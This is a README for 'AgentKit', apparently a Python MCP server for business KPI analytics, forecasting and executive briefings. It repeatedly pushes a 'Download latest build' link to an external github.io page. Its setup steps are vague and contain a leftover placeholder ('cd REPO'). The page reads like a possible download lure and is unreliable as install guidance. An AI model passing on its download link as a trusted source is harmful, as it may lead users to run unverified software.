# AgentKit - Business Intelligence MCP Server 2026

> **AgentKit is a Python MCP server that enables AI agents to work with KPI analytics, business resources, forecasting, and executive reporting workflows in the current 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leo-edwardsca9108/agentkit-business-analytics?style=flat-square)](https://github.com/leo-edwardsca9108/agentkit-business-analytics)

---

<p align="center">
  <a href="https://leo-edwardsca9108.github.io/agentkit-business-analytics/">
    <img src="https://img.shields.io/badge/Download-AgentKit%20Latest-brightgreen?style=for-the-badge" alt="Download AgentKit">
  </a>
</p>

> **[Download AgentKit latest build](https://leo-edwardsca9108.github.io/agentkit-business-analytics/)**

---

[Download Latest Build](https://leo-edwardsca9108.github.io/agentkit-business-analytics/)

---

## What AgentKit Provides

AgentKit brings business intelligence workflows to MCP-enabled AI clients. Its six tools support KPI lookups, business health evaluation, anomaly discovery, metric exploration, forecasting, and the creation of executive-ready summaries.

Analytics are grouped into Finance, Growth, Operations, People, ESG, and IT Operations. The server works with Claude Desktop, Cursor, LangGraph, CrewAI, DSPy, and other compatible agent environments. PostgreSQL serves as the storage backend for KPI data.

---

## Capabilities

- Six MCP tools covering KPI queries, business health scoring, anomaly detection, forecasting, metric discovery, and executive reporting
- Six business resource categories: Finance, Growth, Operations, People, ESG, and IT Operations
- A reusable monthly executive briefing prompt for repeatable reporting
- Support for multi-agent workflows built with LangGraph
- Integrations with the Claude Agent SDK, CrewAI, and DSPy
- MCP connectivity for Claude Desktop, Cursor, and other compatible agent clients
- Forecasting through linear regression and Monte Carlo methods
- PostgreSQL-based KPI persistence
- Configurable routing across Anthropic, Groq, OpenAI, and Ollama models
- Anonymous telemetry with a configurable opt-out

---

## Getting Started

Create a local checkout and isolated Python environment:

```bash
git clone https://github.com/leo-edwardsca9108/agentkit-business-analytics.git
cd REPO
python -m venv .venv
```

Enable the virtual environment for your operating system:

```bash
# macOS and Linux
source .venv/bin/activate

# Windows PowerShell
.venv\Scripts\Activate.ps1
```

Next, install the project's declared dependencies and configure the MCP server through the entry point provided in the repository. Once configured, AgentKit can be added to Claude Desktop, Cursor, or another MCP-compatible client.

---

## Typical Workflow

AgentKit is generally used in the following sequence:

1. Set the PostgreSQL connection and choose the language-model provider.
2. Add AgentKit as an MCP server in the selected client.
3. Have the client list or discover the available KPI metrics.
4. Examine results for an area such as Finance, Growth, or Operations.
5. Run health scoring, anomaly analysis, or a forecast as needed.
6. Turn the collected results into a monthly executive briefing.

The server can also be embedded in higher-level applications and agent workflows using LangGraph, CrewAI, DSPy, or the Claude Agent SDK.

---

## Environment Configuration

Use the deployment's environment configuration to provide database access, model-routing preferences, and telemetry behavior:

```env
DATABASE_URL=postgresql://user:password@host:5432/database
LLM_PROVIDER=ollama
TELEMETRY_OPTOUT=false
```

AgentKit supports model selection through Anthropic, Groq, OpenAI, and Ollama. Supply the credentials and variable names required by the project configuration for the chosen provider. Configure the telemetry opt-out value based on the needs of the deployment.

---

## Prerequisites

- A Python runtime
- PostgreSQL for storing KPI data
- Credentials for the selected LLM provider when that provider requires them
- An MCP-compatible client or agent framework
- Network connectivity to the configured database and model provider
- Enough storage for the KPI information retained by the deployment

Compatible clients and frameworks include Claude Desktop, Cursor, LangGraph, CrewAI, DSPy, and other systems capable of connecting to MCP servers.

---

## Frequently Asked Questions

### What can connect to AgentKit?

Any MCP-compatible client can use AgentKit, including Claude Desktop and Cursor. Agent workflows based on LangGraph, CrewAI, DSPy, and the Claude Agent SDK are supported as well.

### Which business intelligence operations are supported?

AgentKit provides KPI querying, health scoring, anomaly detection, metric discovery, forecasting, and executive-summary generation. Its forecasting methods include linear regression and Monte Carlo analysis.

### What database stores the KPIs?

PostgreSQL is used as the KPI storage backend. The database connection must be configured before the server is launched.

### Are different LLM providers supported?

Yes. AgentKit can route models through Anthropic, Groq, OpenAI, or Ollama when the required provider credentials and environment settings are supplied.

### Where can I get updates?

Use the latest build link in this README or monitor the project repository for new releases and configuration updates.

### What should I check if the client cannot connect?

Make sure the virtual environment is active, dependencies are installed, and the PostgreSQL server is reachable. Check the selected model provider configuration and confirm that the MCP client references the correct AgentKit server entry point.

### Is telemetry optional?

Anonymous telemetry has an opt-out setting. Enable the relevant opt-out configuration before starting the server when telemetry should not be transmitted.

---

## Roadmap

- Further improvements to KPI analytics workflows
- More examples and patterns for agent-framework integrations
- Continued development of forecasting and executive-reporting functionality
- Ongoing updates to configuration and client integration support

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
